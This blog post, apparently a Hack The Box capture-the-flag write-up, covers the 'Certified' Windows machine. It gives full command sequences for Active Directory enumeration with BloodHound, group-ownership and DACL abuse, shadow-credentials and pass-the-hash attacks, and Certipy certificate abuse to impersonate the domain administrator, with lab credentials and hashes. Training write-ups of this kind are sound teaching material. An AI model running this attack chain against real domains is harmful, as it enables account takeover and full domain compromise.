---
layaout: post
image: /assets/certified/certified.png
title: Certified Write Up HTB
date: 13-03-2025
categories: [Write ups]
tag: [Windows, Active Directory, Privilege Escalation, Kerberos Attacks, Certipy, BloodHound, Medium Difficulty]
excerpt: "Certified on Hack The Box is a medium-difficulty Windows machine centered around exploiting vulnerabilities in an Active Directory environment and leveraging misconfigurations in certificate services. The initial foothold requires enumerating the Active Directory with tools like BloodHound to discover potential attack paths. Privilege escalation involves abusing certificate-based authentication through Certipy, allowing the attacker to impersonate high-privileged users and gain control of the system.

This machine is ideal for intermediate users looking to enhance their skills in Active Directory exploitation, certificate-based attacks, and post-exploitation techniques in Windows environments."
---
![img-description](/assets/certified/certified.png)

Certified on Hack The Box is a medium-difficulty Windows machine centered around exploiting vulnerabilities in an Active Directory environment and leveraging misconfigurations in certificate services. The initial foothold requires enumerating the Active Directory with tools like BloodHound to discover potential attack paths. Privilege escalation involves abusing certificate-based authentication through Certipy, allowing the attacker to impersonate high-privileged users and gain control of the system.

This machine is ideal for intermediate users looking to enhance their skills in Active Directory exploitation, certificate-based attacks, and post-exploitation techniques in Windows environments.

## ENUMERATION
---
### Nmap Scan
---

An initial Nmap scan revealed several open ports on the domain controller (DC01):

```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-11-22 17:02:33Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP over SSL
3268/tcp  open  ldap          Microsoft Global Catalog
3269/tcp  open  ssl/ldap      Microsoft Global Catalog over SSL
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        .NET Message Framing
```

#### Key observations:
---

- **Active Directory Indicators**: Ports 88 (Kerberos), 389 (LDAP), and 445 (SMB) suggest the presence of a Windows domain controller.
- **SSL Certificates**: The certificate details revealed the hostname `DC01.certified.htb` and additional domain information, confirming the target's role as a certificate authority.
- **SMB Signing**: Nmap scripts indicated SMB signing is enabled and required, which may limit some SMB attack vectors.

### Testing SMB Login
---

With the obtained credentials, SMB authentication was tested using `nxc`:

```
nxc smb 10.10.11.41 -u 'judith.mader' -p 'judith09'
```

Output:

```
SMB         10.10.11.41     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certified.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.41     445    DC01             [+] certified.htb\judith.mader:judith09
```

The credentials were successfully authenticated against the SMB service, confirming low-privilege access to the domain.

### LDAP Enumeration with BloodHound
---

To map the domain structure and discover potential attack paths, LDAP enumeration was conducted using `nxc` with BloodHound collection enabled:

```
nxc ldap dc01.certified.htb -u judith.mader -p judith09 --bloodhound --collection All --dns-tcp --dns-server 10.10.11.41
```

Output:

```
LDAP        10.10.11.41     389    DC01             [+] certified.htb\judith.mader:judith09
LDAP        10.10.11.41     389    DC01             Resolved collection methods: objectprops, session, localadmin, dcom, trusts, rdp, container, psremote, acl, group
LDAP        10.10.11.41     389    DC01             Done in 00M 33S
LDAP        10.10.11.41     389    DC01             Compressing output into /home/kali/.nxc/logs/DC01_10.10.11.41_2024-11-22_054454_bloodhound.zip
```

The output was successfully collected and compressed into a ZIP file, ready for BloodHound analysis.

#### BloodHound Analysis
---

![Texto alternativo](/assets/certified/Screenshot%202025-03-03%20153723.jpg)

The BloodHound graph revealed several key attack paths within the Active Directory environment:

- **Judith Mader's Permissions**: Judith Mader has WriteOwner permissions on the Management group.
- **Service Account (Management_SVC)**: The Management_SVC account has GenericWrite permissions over the Management group.
- **CA_Operator Privilege**: The Management_SVC account has GenericAll permissions over the CA_Operator user.

# User Privilege Escalation
---
### 1. **Data Collection with nxc**

    - Action: Enumerated Active Directory data and found that judith.mader could modify the “Management” group.
    - Details: Used BloodHound to analyze the data collected by nxc.

### 2. **Setting Ownership**

    Used `bloodyAD` to set judith.mader as the owner of the “Management” group:

```bash
bloodyAD --host "10.10.11.41" -d "certified.htb" -u "judith.mader" -p "judith09" set owner Management judith.mader
```

### 3. **Granting Write Permissions**

    Updated the group permissions with `dacledit.py`:

```bash
impacket-dacledit -action 'write' -rights 'WriteMembers' -principal 'judith.mader' -target-dn 'CN=MANAGEMENT,CN=USERS,DC=CERTIFIED,DC=HTB' 'certified.htb'/'judith.mader':'judith09'
```

### 4. **Adding to Management Group**

    Added judith.mader to the “Management” group:

```bash
bloodyAD --host 10.10.11.41 -d 'certified.htb' -u 'judith.mader' -p 'judith09' add groupMember "Management" "judith.mader"
```

### 5. **Exploiting KeyCredentialLink**

    Used `pywhisker` to create a certificate for management_svc:

```bash
pywhisker -d "certified.htb" -u "judith.mader" -p judith09 --target "management_svc" --action add
```

You need to have an environment with `pyopenssl` installed, if you have the environment do a 

```bash
source /YOUR ENVIRONMENT
```

Once you have started the environment do this

```bash
pip install --upgrade pyopenssl
```

And continue with the following command

### 6. **Obtaining a TGT**

    Generated a Kerberos TGT for management_svc:

```bash
gettgtpkinit.py certified.htb/management_svc -cert-pfx /home/ghost/HTB/Maquinas/Certified/exploits/xfkTN93D.pfx -pfx-pass P5NA3JmDjY0w6OejTlRn fuck.ccache
```

If you do not get an error, continue to the next step, if you get an error, follow this:

**If you get an error it is because the minikerberos is sensitive to the time difference, therefore to resolve it and synchronize the time of your machine with that of the certified machine we execute the following**

```bash
sudo ntpdate certified.htb
```

And now you can continue to the next step.

### 7. **Recovering NT Hash**

Here we need to export the variable fuckk.cache to use the getnthash tool. To do this we do the following:

```bash
export KRB5CCNAME=/path/to/file.ccache
```

Now we can do the following

    Extracted NT hash for management_svc using `gettgtpkinit.py`:

```bash
getnthash.py certified.htb/management_svc -key 834e81cd4330a03fe83919f7###########################
```

### 8. **Logging in with Evil-WinRM**

    Logged in as management_svc with Evil-WinRM:

```bash
evil-winrm -i 10.10.11.41 -u management_svc -H a091c1832bcdd4677c28b5a6a1295584
```

And get the `user.txt` in `management_scv/Desktop`
## Root Privilege Escalation
---

### 1. **Identifying GenericAll Rights**

    Discovered that `management_svc` had GenericAll rights over `ca_operator`.

### 2. **Adding KeyCredential**

    Used `certipy-ad` to modify ca_operator KeyCredential:

```bash
certipy-ad shadow auto -u management_svc@certified.htb -hashes a091c1832bcdd4677c28b5a6a1295584 -account ca_operator
```

### 3. **Updating UPN of ca_operator**

    Updated the UPN (UserPrincipalName) of ca_operator to administrator:

```bash
certipy-ad account update -u management_svc@certified.htb -hashes a091c1832bcdd4677c28b5a6a1295584 -user ca_operator  -upn administrator
```

### 4. **Requesting Administrator Certificate**

    Requested a certificate for the administrator account using `certipy-ad`:

```bash
certipy-ad req -username ca_operator@certified.htb -hashes b4b86f45c6018f1b664f70805f45d8f2 -ca certified-DC01-CA -template CertifiedAuthentication
```

### 5. **Restoring Original UPN**

    Restored ca_operator’s UPN to its original value:

```bash
certipy-ad account update -u management_svc@certified.htb -hashes a091c1832bcdd4677c28b5a6a1295584 -user ca_operator  -upn ca_operator@certified.htb
```

### 6. **Obtaining Administrator TGT**

    Authenticated as administrator with the new certificate:

```bash
certipy-ad auth -pfx administrator.pfx -domain certified.htb
```

### 7. **Logging in as Administrator**

    Logged in with Evil-WinRM as administrator:

```bash
evil-winrm -u administrator -H 0d5b49608bbce1751f708748f67e2d34 -i 10.10.11.41
```

```bash
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
*Evil-WinRM* PS C:\Users\Administrator> ls


    Directory: C:\Users\Administrator


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---       10/22/2024   1:15 PM                3D Objects
d-r---       10/22/2024   1:15 PM                Contacts
d-r---       10/22/2024   1:15 PM                Desktop
d-r---       10/22/2024   1:15 PM                Documents
d-r---       10/22/2024   1:15 PM                Downloads
d-r---       10/22/2024   1:15 PM                Favorites
d-r---       10/22/2024   1:15 PM                Links
d-r---       10/22/2024   1:15 PM                Music
d-r---       10/22/2024   1:15 PM                Pictures
d-r---       10/22/2024   1:15 PM                Saved Games
d-r---       10/22/2024   1:15 PM                Searches
d-r---       10/22/2024   1:15 PM                Videos


*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---         3/3/2025  12:31 PM             34 root.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
8590db865946#########################
```

And we already got both flags!